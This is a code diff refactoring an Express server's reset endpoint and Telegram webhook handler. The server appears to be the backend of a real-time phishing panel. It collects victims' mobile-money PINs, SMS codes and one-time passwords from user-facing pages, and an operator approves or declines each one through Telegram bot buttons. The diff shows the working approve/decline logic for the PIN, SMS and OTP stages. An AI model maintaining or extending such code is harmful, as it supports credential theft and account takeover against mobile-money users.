@@ -343,13 +343,14 @@ app.post('/api/decline', requireAdmin, (req, res) => {
   res.json({ ok: true });
 });
 
-/* ---- Reset (PUBLIC — called by user pages before submitting) ---- */
+/* ---- Reset (PUBLIC — clears decision only, not submissions) ---- */
 app.post('/api/reset', (req, res) => {
   const state = readState();
   delete state.decision;
   delete state.declineMessage;
   delete state.decidedAt;
-  // Don't delete submissions — each step overwrites its own
+  // Submissions are intentionally NOT cleared here.
+  // Each submit-* endpoint overwrites its own submission.
   writeState(state);
   broadcast(state);
   res.json({ ok: true, state });
@@ -364,13 +365,12 @@ app.post('/api/telegram/webhook', async (req, res) => {
   if (!cb) return;
 
   const data = cb.data || '';
-  const [action, refId] = data.split(':');
+  const [action] = data.split(':');
   const state = readState();
 
   /* MoMo PIN */
   if (action === 'approve' || action === 'decline') {
-    const current = state.latestSubmission;
-    if (!current) {
+    if (!state.latestSubmission) {
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No submission found.' });
       return;
     }
@@ -403,8 +403,7 @@ app.post('/api/telegram/webhook', async (req, res) => {
 
   /* SMS */
   if (action === 'sms-approve' || action === 'sms-decline') {
-    const current = state.latestSmsSubmission;
-    if (!current) {
+    if (!state.latestSmsSubmission) {
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No SMS submission found.' });
       return;
     }
@@ -437,12 +436,10 @@ app.post('/api/telegram/webhook', async (req, res) => {
 
   /* OTP */
   if (action === 'otp-approve' || action === 'otp-decline' || action === 'otp-inactive') {
-    const current = state.latestOtpSubmission;
-    if (!current) {
+    if (!state.latestOtpSubmission) {
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No OTP submission found.' });
       return;
     }
-
     if (action === 'otp-approve') {
       state.decision = 'otp-approved';
       state.decidedAt = new Date().toISOString();
